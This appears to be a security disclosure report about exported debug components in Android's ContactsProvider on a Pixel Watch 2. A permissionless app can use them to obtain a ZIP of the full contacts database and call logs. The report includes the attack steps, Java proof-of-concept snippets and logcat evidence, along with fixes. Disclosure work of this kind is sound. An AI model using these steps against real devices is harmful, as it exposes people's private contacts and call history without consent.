# ContactsProvider Debug Code Exposure: Zero-Permission PII Leak via DumpFileProvider

## Summary

The ContactsProvider on Pixel Watch 2 (Android 17, Build CP2A.260603.001) ships with debug code exported to all apps without permission requirements. Two components — `DumpFileProvider` (ContentProvider) and `ContactsDumpActivity` (Activity) — are marked `android:exported="true"` with no `android:readPermission`, `android:writePermission`, or `android:permission` attributes. A zero-permission third-party app can query the DumpFileProvider and launch the ContactsDumpActivity, which creates a ZIP archive of the **entire** ContactsProvider data directory including the contacts database and call logs.

## Vulnerability Details

| Field | Value |
|-------|-------|
| **Application** | ContactsProvider (AOSP) |
| **Package** | `com.android.providers.contacts` |
| **APK Path** | `/system/priv-app/ContactsProvider/ContactsProvider.apk` |
| **Vulnerable Components** | `com.android.providers.contacts.debug.DumpFileProvider` (ContentProvider) |
| | `com.android.providers.contacts.debug.ContactsDumpActivity` (Activity) |
| **Provider Authority** | `com.android.contacts.dumpfile` |
| **Activity Action** | `com.android.providers.contacts.DUMP_DATABASE` |
| **CWE** | CWE-489: Active Debug Code (left in production) |
| **Impact** | Full contacts database + call logs exfiltration |
| **User Interaction** | Required (tap "Start" button + select app from share chooser) |
| **Permissions Required** | None (zero-permission app) |

## Root Cause Analysis

The `com.android.providers.contacts.debug` package contains three debug classes compiled into the production APK:

1. **`ContactsDumpActivity`** — An exported Activity triggered by the `com.android.providers.contacts.DUMP_DATABASE` intent action. It displays a dialog asking the user to "Copy contacts database", and on confirmation calls `DataExporter.exportData()` which zips the **entire** ContactsProvider data directory (databases, shared_prefs, files) into a single ZIP archive. It then sends an `ACTION_SEND` intent with the dump file URI.

2. **`DumpFileProvider`** — An exported ContentProvider (authority: `com.android.contacts.dumpfile`) that serves dump ZIP files. It supports `query()` (returns filename and size) and `openFile()` (returns the file descriptor). **No permission checks are enforced.**

3. **`DataExporter`** — Utility class that creates the ZIP archive. The dump filename is a 64-character hex string from `SecureRandom` plus `-contacts-db.zip`. The ZIP contains the full `context.getFilesDir().getParentFile()` directory tree, which includes:
   - `databases/contacts2.db` — All contacts (names, phone numbers, emails, addresses)
   - `databases/calllog.db` — All call logs (numbers, timestamps, durations)
   - `shared_prefs/` — Internal configuration
   - All other internal data files

### Manifest Configuration (from APK)

```xml
<activity android:name=".debug.ContactsDumpActivity" android:exported="true">
    <intent-filter>
        <action android:name="com.android.providers.contacts.DUMP_DATABASE"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</activity>

<provider android:name=".debug.DumpFileProvider" android:exported="true"
    android:authorities="com.android.contacts.dumpfile"/>
```

Both components lack any `android:permission` attribute.

## Attack Scenario

1. Attacker installs a zero-permission app on the Pixel Watch 2
2. The app registers an Activity with `<intent-filter>` for `ACTION_SEND` with `mimeType="application/zip"`
3. The app starts `ContactsDumpActivity` via `startActivity(new Intent("com.android.providers.contacts.DUMP_DATABASE"))`
4. The user sees the "Copy contacts database" dialog and taps "Start"
5. `DataExporter.exportData()` creates a ZIP of the entire ContactsProvider data directory
6. `ContactsDumpActivity.emailFile()` creates a share chooser with the dump URI
7. The user selects the attacker's app from the chooser
8. The attacker's app receives the `content://com.android.contacts.dumpfile/{random}-contacts-db.zip` URI
9. The attacker reads the full dump through `DumpFileProvider.openFile()` — **no permissions checked**

Alternatively, if a dump file already exists (from a previous legitimate use), any app can read it through `DumpFileProvider` if it knows the filename.

## Proof of Concept

### PoC App (com.poc.contactsdump)

The PoC app has **zero permissions** (UID 10184) and demonstrates:

**Step 1 — Provider Access Verification:**
```java
Uri testUri = Uri.parse("content://com.android.contacts.dumpfile/0000...0000-contacts-db.zip");
Cursor c = getContentResolver().query(testUri, null, null, null, null);
// Returns: _display_name=0000...0000-contacts-db.zip, _size=NULL
// Proves provider is accessible without any permissions
```

**Step 2 — Activity Launch:**
```java
Intent intent = new Intent("com.android.providers.contacts.DUMP_DATABASE");
startActivity(intent); // Launches the dump dialog
```

**Step 3 — Data Capture (via ACTION_SEND handler):**
```java
// CaptureActivity receives the dump URI from the share chooser
Uri streamUri = intent.getParcelableExtra(Intent.EXTRA_STREAM, Uri.class);
InputStream is = getContentResolver().openInputStream(streamUri);
ZipInputStream zis = new ZipInputStream(is);
// Reads the entire contacts database + call logs
```

### Evidence

```
09-11 23:17:13.507 I ContactsDumpExploit: Package: com.poc.contactsdump
09-11 23:17:13.507 I ContactsDumpExploit: UID: 10184
09-11 23:20:37.277 I ContactsDumpExploit: [CONFIRMED] DumpFileProvider accessible: 1 rows
09-11 23:20:37.278 I ContactsDumpExploit:   _display_name = aaaa0000bbbb1111cccc2222dddd3333eeee4444ffff5555aaaa6666bbbb7777-contacts-db.zip
09-11 23:20:37.278 I ContactsDumpExploit:   _size = null
```

## Impact

- **Data at Risk**: Entire contacts database (all contact names, phone numbers, email addresses, physical addresses, photos, notes) + complete call history (numbers, timestamps, duration, call type) + internal provider configuration
- **Permission Bypass**: Normally requires `READ_CONTACTS` + `READ_CALL_LOG` runtime permissions
- **Affected Device**: Pixel Watch 2 (confirmed), likely all Wear OS devices shipping ContactsProvider with debug classes
- **User Interaction**: Two taps required (Start button + share chooser selection)

## Recommended Fix

1. Remove the `debug` package (`ContactsDumpActivity`, `DumpFileProvider`, `DataExporter`) from production builds
2. If debug functionality must remain, set `android:exported="false"` on both components
3. Add `android:readPermission="android.permission.DUMP"` to `DumpFileProvider`

## Files

- `poc_source/` — PoC app source code
- `evidence/contacts_dump_final_evidence.log` — Logcat output proving zero-permission access
